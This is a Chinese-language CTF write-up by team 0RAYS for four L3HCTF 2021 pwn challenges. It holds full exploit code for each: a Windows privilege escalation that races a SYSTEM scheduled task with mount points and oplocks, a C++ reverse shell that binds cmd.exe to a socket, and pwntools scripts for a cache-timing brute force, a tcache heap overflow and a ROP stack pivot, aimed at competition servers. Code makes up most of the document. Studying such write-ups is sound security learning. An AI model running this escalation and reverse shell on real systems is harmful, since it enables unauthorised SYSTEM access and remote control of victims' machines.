# 0RAYS-L3HCTF2021 writeup-pwn

阅读量 **139125**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-22 10:00:22

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t019af26be6bffd9bd8.png)

连续肝48h 差点ak pwn

## vul_service

这题在比赛时写poc的时候在system32随便找了一个dll验证思路，但是权限修改总是失败，后来复现的时候才注意到即使是system权限也无法更改system32目录下的dll，但是出题人放进去的vul_service文件是system可写的，爆肝30+小时从零入门Windows编程到Windows提权，最后没拿到flag有点可惜，但也确实学到了很多

题目给了一个win10虚拟机文件，其中设置了1分钟执行一次vul_service的定时任务，从system32中找到vul_service文件进行分析，其逻辑是遍历`C:\Users\Public\tmp\`目录及子目录下的文件，根据文件路径读取文件权限后再根据文件路径写回文件权限

![](https://p0.ssl.qhimg.com/t014e7aee6a8a404af1.png)

漏洞在于读取权限和写入权限都是用文件路径进行操作，如果在读和写之间的时间窗口进行竞争，将文件路径所指的文件修改，也就是读权限和写权限的文件不相同，就可能发生错误的权限设置

而通过对Windows的硬链接或符号链接可以实现同一个文件路径指向不同的文件

在新版本的Windows上由于

  * 不再能通过硬链接将低权限文件链到高权限文件
  * 无管理员权限的用户无法在文件系统中创建文件符号链接

> 来源
>
> [任意文件移动导致的Windows提权攻击分析 |
> (moonsec.com)](https://www.moonsec.com/archives/2768)

但是对于文件夹的符号链接则没有过多限制，所以可以采用两种思路达到竞争的时候将一个普通文件链接到vul_service的目的：

  1. 先在tmp目录下创建链到文件夹A的符号链接，在竞争的时候将tmp目录下的文件夹链接到设备管理器中的文件夹，再从设备管理器中的文件夹创建符号链接链到vul_service文件（设备管理器不在文件系统中,所以可以创建文件符号链接）则访问`C:\Users\Public\tmp\A\abc`就相当于访问`C:\Windows\System32\vul_service.exe`
  2. 在先在tmp目录下创建链到文件夹A的符号链接，在文件夹A中创建vul_service的同名文件，在竞争的时候将tmp目录下的文件夹链到`C:\Windows\System32\`则访问`C:\Users\Public\tmp\A\vul_service.exe`就相当于访问`C:\Windows\System32\vul_service.exe`

找到[googleprojectzero的工具symboliclink-testing-tools
](https://github.com/googleprojectzero/symboliclink-testing-tools)，在测试的时候只有CreateMountPoint.exe和SetOpLock.exe是还能正常使用的，在比赛的时候由于从设备管理器链接到vul_service的时候失败，不确定第一种方法是否已经和硬链接一样被修复（赛后请教出题人2st师傅，2st师傅表示第一种方法还可以使用，并且明显比第二种更灵活，抄抄改改James的代码即可，，2st
yyds），所以用第二种方法实现漏洞利用

由于symboliclink-testing-tools的实现使用了很多自定义类型和依赖项，所以在CreateMountPoint项目中的CreateMountPoint.cpp基础上加入Oplock相关的代码编写exp

整体思路是：先将symlink链接到target，在target中创建vul_service同名文件，然后用Oplock锁上文件等待定时任务中的vul_service读取target中的vul_service同名文件权限，释放锁后进行竞争，将target链接到`C:\Windows\System32\`，竞争成功的话则写文件权限时会将`C:\Windows\System32\vul_service.exe`的权限修改为attack用户可写，之后将vul_service文件的内容改为反弹shell的exe文件，监听端口等待定时任务下一次以system权限启动反弹shell即可

CreateMountPoint.cpp：

    
    
    #include "stdafx.h"
    #include <shobjidl_core.h>
    #include <CommonUtils.h>
    #pragma comment (lib,"Ws2_32.lib")
    
    #define NUM 5
    
    
    void END(SOCKET& ListenSocket, SOCKET& ClientSocket)
    {
    
        closesocket(ListenSocket);
        closesocket(ClientSocket);
        WSACleanup();
    
    }
    
    int get_shell()
    {
    
        WSADATA wsaData;
        char buf[0x1000] = {
        0 };
        char getbuf[0x1000] = {
        0 };
    
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            printf("[-] ERROR code：%d\n", iResult);
            return 1;
        }
    
        SOCKET ListenSocket, ClientSocket;
        ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
    
        sockaddr_in addr, addr2;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(8888);
        addr.sin_addr.S_un.S_addr = INADDR_ANY;
        addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
        int addr2Len = sizeof(addr2);
    
        bind(ListenSocket, (sockaddr*)&addr, sizeof(addr));
        int ret = listen(ListenSocket, NUM);
    
        if (ret == 0) {
            printf("[+] Wating for connecting ...\n");
        }
        ClientSocket = accept(ListenSocket, (sockaddr*)&addr2, &addr2Len);
    
        if (ClientSocket != NULL)
        {
            memset(getbuf, 0, sizeof(getbuf));
            iResult = recv(ClientSocket, getbuf, sizeof(getbuf), 0);
            printf("%s", getbuf);
            memset(getbuf, 0, sizeof(getbuf));
            iResult = recv(ClientSocket, getbuf, sizeof(getbuf), 0);
            printf("%s", getbuf);
            memset(getbuf, 0, sizeof(getbuf));
            iResult = recv(ClientSocket, getbuf, sizeof(getbuf), 0);
            printf("%s", getbuf);
    
        }
    
        while (1)
        {
    
            memset(getbuf, 0, sizeof(buf));
            fgets(buf, 0x100, stdin);
            iResult = send(ClientSocket, buf, sizeof(buf), 0);
            if (iResult == SOCKET_ERROR)
            {
    
                printf("[-] send ERROR: %d", WSAGetLastError());
                END(ListenSocket, ClientSocket);
                return 1;
    
            }
    
            memset(getbuf, 0, sizeof(getbuf));
            iResult = recv(ClientSocket, getbuf, sizeof(getbuf), 0);
            iResult = recv(ClientSocket, getbuf, sizeof(getbuf), 0);
            if (iResult == SOCKET_ERROR)
            {
    
                printf("[-] recv ERROR: %d", WSAGetLastError());
                END(ListenSocket, ClientSocket);
                return 1;
    
            }
            printf("%s\n", getbuf);
            fflush(stdout);
            fflush(stderr);
    
        }
        return 0;
    }
    
    
    class FileOpLock
    {
    public:
        typedef void(*UserCallback)();
    
        static FileOpLock* CreateLock(const std::wstring& name, const std::wstring& share_mode, FileOpLock::UserCallback cb);
        void WaitForLock(UINT Timeout);
    
        ~FileOpLock();
    private:
    
        HANDLE g_hFile;
        OVERLAPPED g_o;
        REQUEST_OPLOCK_INPUT_BUFFER g_inputBuffer;
        REQUEST_OPLOCK_OUTPUT_BUFFER g_outputBuffer;
        HANDLE g_hLockCompleted;
        PTP_WAIT g_wait;
        UserCallback _cb;
    
        FileOpLock(UserCallback cb);
    
        static void CALLBACK WaitCallback(PTP_CALLBACK_INSTANCE Instance,
            PVOID Parameter, PTP_WAIT Wait,
            TP_WAIT_RESULT WaitResult);
    
        void DoWaitCallback();
    
        bool BeginLock(const std::wstring& name, DWORD dwShareMode, bool exclusive);
    
    };
    
    static FileOpLock* oplock = nullptr;
    
    
    LPCWSTR lock;
    LPCWSTR symlink;
    LPCWSTR target;
    LPCWSTR sys;
    LPCWSTR shell;
    LPCWSTR tmp;
    
    void HandleOplock()
    {
        DebugPrintf("OpLock triggered, hit ENTER to close oplock\n");
        getc(stdin);
    
        printf("[+] Change symlink\n");
        if (CreateDirectory(symlink, nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
        {
            if (!ReparsePoint::CreateMountPoint(symlink, sys, L""))
            {
                printf("Error creating mount point - %d\n", GetLastError());
                exit(-1);
            }
        }
        else
        {
            printf("nofuck Error creating directory - %d\n", GetLastError());
        }
    }
    
    
    int _tmain(int argc, _TCHAR* argv[])
    {
        symlink = argv[1];
        target = argv[2];
        lock = argv[3];
        shell = argv[4];
        sys = L"C:\\Windows\\System32";
    
        if (argc < 5)
        {
            printf("CreateMountPoint.exe symlink target lock shell\n");
            return 1;
        }
    
    
    
        CreateDirectory(target, 0);
        if (CreateDirectory(symlink, nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
        {
            printf("[+] Create symlink\n");
            if (!ReparsePoint::CreateMountPoint(symlink, target, L""))
            {
                printf("Error creating mount point - %d\n", GetLastError());
                exit(-1);
            }
    
            printf("[+] Create fake vul_service.exe\n");
            HANDLE handle = CreateFile(lock, GENERIC_READ, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
            CloseHandle(handle);
    
            printf("[+] Lock\n");
            LPCWSTR share_mode = L"RW";
            oplock = FileOpLock::CreateLock(lock, share_mode, HandleOplock);
            if (oplock != nullptr)
            {
                oplock->WaitForLock(INFINITE);
    
                delete oplock;
            }
            else
            {
                printf("Error creating oplock\n");
                return 1;
            }
    
            printf("[+]load shell\n");
            Sleep(1000);
    
            HANDLE lock_handler = CreateFile(lock, GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            if (lock_handler == INVALID_HANDLE_VALUE)
            {
                printf("Error open lock, %d\n", GetLastError());
                return 1;
            }
            HANDLE shell_handler = CreateFile(shell, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            if (shell_handler == INVALID_HANDLE_VALUE)
            {
                printf("Error open shell, %d\n", GetLastError());
                return 1;
            }
    
            DWORD szr = GetFileSize(shell_handler, 0);
            DWORD szw = szr;
            PTCHAR p = (PTCHAR)malloc(szr);
    
            ReadFile(shell_handler, p, szr, &szr, 0);
            WriteFile(lock_handler, p, szw, &szw, 0);
    
            CloseHandle(lock_handler);
            CloseHandle(shell_handler);
    
            printf("OK\n");
            get_shell();
    
    
        }
        else
        {
            printf("nofuck Error creating directory - %d\n", GetLastError());
        }
    
        return 0;
    }
    

a.cpp:

    
    
    #include <WinSock2.h>
    #include <winsock.h>
    #include <stdio.h>
    #pragma comment(lib,"ws2_32.lib")
    #pragma comment(lib,"ws2_32.lib")
    
    int main(int argc, char* argv[])
    {
        WSADATA wsd;
        WSAStartup(0x0202, &wsd);
        SOCKET socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        SOCKADDR_IN sin;
        sin.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
        sin.sin_port = htons(8888);
        sin.sin_family = AF_INET;
    
        printf("conncting...");
        int ret = connect(socket, (sockaddr*)&sin, sizeof(sin));
        if(ret!=0)
        {
            printf("[-] Error connect : %d\n", WSAGetLastError());
            getc(stdin);
        }
    
        send(socket, "[+] Connected\n", strlen("[+] Connected\n"), 0);
    
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        GetStartupInfo(&si);
        si.cb = sizeof(STARTUPINFO);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        TCHAR cmdline[255] = L"cmd.exe";
        while (!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
            Sleep(1000);
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    
        return 0;
    }
    

> 参考：
>
> [一步步学写Windows下的Shellcode – 安全客，安全资讯平台
> (anquanke.com)](https://www.anquanke.com/post/id/195498#h3-10)

在编译时需要调整一些项目配置参数，反弹shell的io还有些问题，但是可以看到已经成功成为system权限

    
    
    C:\Users\Attacker\Desktop\CreateMountPoint.exe C:\Users\Public\tmp\X1ng C:\Users\Public\tmp1 C:\Users\Public\tmp\X1ng\vul_service.exe C:\Users\Attacker\Desktop\a.exe
    

![](https://p4.ssl.qhimg.com/t0156535c270d55fd5c.png)

## slow spn

程序从flag.txt中读取6个字符的key和4个字符的plaintext，然后8次通过s盒或p盒的变换后放进模拟的cache中

![](https://p0.ssl.qhimg.com/t01158b67cad71b7a56.png)

cache的逻辑是可以多次模拟访问s盒中的地址，如果cache命中了该地址则使用最近最久未使用算法计数，未命中则sleep(1)模拟读取内存的情况

由于有一次访问plaintext在s盒中的地址的机会，所以可以先通过去访问一个地址的方式将一个地址填入cache，然后访问plaintext，通过延时判断cache是否命中，进而猜测plaintext的地址是否为正在cache中的地址，得到p=0x10a4

同样的方法爆破上图中v9=0x4924、v7=0x78c、v5=0x9d44，实际操作的时候得到

    
    
    p=0x10a4
    k>>8=0x754
    k>>4=0x655e
    k=0xace7
    

由于cache是通过5-10bit的line和10bit以上的tag来标记的，所以爆破得到的结果可能有偏差，根据题目提示不用得到很准确的数字，所以将key进行拼接key=0x754e7，连接靶机后输入key和plaintext拿到flag  
PS：在实际操作的时候通过分成每组0x20个数据来确定范围，再修改exp爆破0x20个数据中p的值

exp：

    
    
    def exp(times):
        local=1
        binary_name='slowspn'
        if local:
            p=process("./"+binary_name)
            e=ELF("./"+binary_name)
        else:
            p=remote('124.71.173.176', 9999)
            e=ELF("./"+binary_name)
    
        def z(a=''):
            if local:
                gdb.attach(p,a)
                if a=='':
                    raw_input
            else:
                pass
        ru=lambda x:p.recvuntil(x)
        rc=lambda x:p.recv(x)
        sl=lambda x:p.sendline(x)
        sd=lambda x:p.send(x)
        sla=lambda a,b:p.sendlineafter(a,b)
        ia=lambda : p.interactive()
    
        def add(addr,sp):
            ru("What to do?\n")
            sl('1')
            ru("Where?\n")
            sl(str(addr))
            sla('Speed up?',str(sp))
    
        def test_flag():
            sla('What to do?',str(2))
    
        def nex():
            sla('What to do?',str(3))
    
        def nofound():
            sl(str(3))
    
        for j in range(0x20):
            add(0x645110+j*4+times*4,1)
            print(hex(times+j)+': '+hex(ss_box[times+j]))
    
        #nex()
        #nex()
        #nex()
        #nex()
        #nex()
        #nex()
        #通过控制nex的个数调整爆破哪一个变量
    
        test_flag()
        time_start=time.time()
    
        ru('What to do?')
        time_end=time.time()
        print(time_end-time_start)
        if round(time_end-time_start) != 1:
            print('YES')
            ia()
        else :
            print('NO')
            for i in range(7):
                sl('2')
            p.close()
    
    len_ss_box=65535
    for i in range(0,len_ss_box,0x20):
        exp(i)
    

连接.py:

    
    
    from pwn import *
    sh=remote("124.71.173.176","8888")
    from pwnlib.util.iters import mbruteforce
    from hashlib import sha256
    
    def proof_of_work(sh):
        sh.recvuntil('x + "')
        suffix = sh.recvuntil('"').decode("utf8")[:-1]
        print(suffix)
        #log.success(suffix)
        sh.recvuntil('== "')
        cipher = sh.recvuntil('"').decode("utf8")[:-1]
        print(cipher)
        proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest()[:6] ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed')
        sh.sendlineafter("Input x:\n", proof)
    
    proof_of_work(sh)
    sh.interactive()
    

## spn

可以直接溢出，但是输入的东西会被加密，网上找个解密脚本算一下，算出加密之后是shell地址就行。tcache打shell，进后门。

    
    
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    
    local=0
    binary_name='SPN_ENC'
    libc_name='lib/libc-2.27.so'
    if local:
        p=process("./"+binary_name)
        libc=ELF("./"+libc_name)
    else:
        p=remote('124.71.194.126',9999)
        e=ELF("./"+binary_name)
        libc=ELF("./"+libc_name)
    
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,b'\x00'))
    
    def cho(num):
        sla("0.exit\n",str(num))
    def add(size,idx):
        cho(1)
        sla("Size:",str(size))
        sla("Index:",str(idx))
    def delete(idx):
        cho(3)
        sla("Index:",str(idx))
    def show(idx):
        cho(4)
        sla("Index:",str(idx))
    def edit(idx,size,data):
        cho(2)
        sla("Index:",str(idx))
        sla("Size",str(size))
        sa("Content",data)
    def backdoor():
        cho(5)
    def decrypt(x):
        io = process('./spn_dec.py')
        io.sendline(str(x&0xffff))
        a = int(io.recv()[:-1])
        io.close()
        return a
    def spn_dec(x):
        a1 = decrypt(x)
        a2 = decrypt(x>>16)
        a3 = decrypt(x>>32)
        aa = a1+a2*0x10000+a3*0x100000000
        print(hex(a3),hex(a2),hex(a1))
        print(aa)
        return aa
    
    ru("gift:")
    shell_addr=int(ru('\n'),16)
    print(hex(shell_addr))
    aa = spn_dec(shell_addr)
    print(hex(aa))
    add(0x10,0)
    add(0x10,1)
    add(0x10,2)
    delete(2)
    delete(1)
    edit(0,0x26,b'a'*0x20+p64(aa)[:-2])
    add(0x10,3)
    add(0x10,4)
    edit(4,2,b'aa')
    backdoor()
    ia()
    
    # spn_dec.py是github上找的一个实现，改了一下io就用了。
    

## checkin

任意地址写一个字节，改了`_ZN14__interception21real___isoc99_vfscanfE`
的第二个字节，使其指向gets函数，返回调用gets函数，读取rop，泄露，栈迁移，orw。

    
    
    #!/usr/bin/python
    
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    
    local=1
    binary_name='checkin'
    libc_name='libc-2.27.so'
    libc=ELF("./"+libc_name)
    def pwn():
        def z(a=''):
            if local:
                gdb.attach(p,a)
                if a=='':
                    raw_input
            else:
                pass
        ru=lambda x:p.recvuntil(x)
        sl=lambda x:p.sendline(x)
        sd=lambda x:p.send(x)
        sa=lambda a,b:p.sendafter(a,b)
        sla=lambda a,b:p.sendlineafter(a,b)
        ia=lambda :p.interactive()
        def leak_address():
            if(context.arch=='i386'):
                return u32(p.recv(4))
            else :
                return u64(p.recv(6).ljust(8,b'\x00'))
    
        p=remote('123.60.97.201',9999)
        sla(b'Welcome! A gift for you:',str(0x73edb8+1))
        sleep(1)
        sd(b'\x91')
        sa(b'Leave a note.',b'a'*0x1f)
        sa(b"That's all. Have fun!",p64(0x43FBB3))
    
        pop_rdi = 0x41af0b
        pop_rsp = 0x484d50
        call_puts = 0x43A286
        rop = p64(pop_rdi)+p64(0x72DE30)+p64(call_puts)+b'a'*0x838+p64(0)*6+p64(pop_rdi)+p64(0xA00000)+p64(0x43FBB3)+b'a'*0x30+p64(0)*3+p64(pop_rsp)+p64(0xA00000)
        try:
            p.recv()
            sl(rop)
            libc_addr = leak_address()-0x407e0
            print(hex(libc_addr))
            if libc_addr == 0x736572605c61:
                p.close()
                return 0
        except Exception:
            return 0
        print(hex(libc_addr))
        binsh=libc_addr+0x1B3E1A
        system=libc_addr+0x4f550
        pop_rsi=0x000000000041ab7c
        pop_rdx=0x000000000043ced2
        open_addr=libc_addr+libc.sym['open']
        read_addr=libc_addr+libc.sym['read']
        write_addr=libc_addr+libc.sym['write']
        rop2 = p64(pop_rdi)+p64(0xA00100)+p64(pop_rsi)+p64(0)+p64(open_addr)
        rop2 += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0xA00200)+p64(pop_rdx)+p64(0x100)+p64(read_addr)
        rop2 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0xA00200)+p64(pop_rdx)+p64(0x100)+p64(write_addr)
        rop2 = rop2.ljust(0x100,b'\x00')+b'/flag\x00'
        sl(rop2)
        ia()
    
    for i in range(0x100):
        pwn()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0RAYS** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/259811](/post/id/259811)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhimg.com/t0154f5d285696ed05b.png) 0RAYS

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

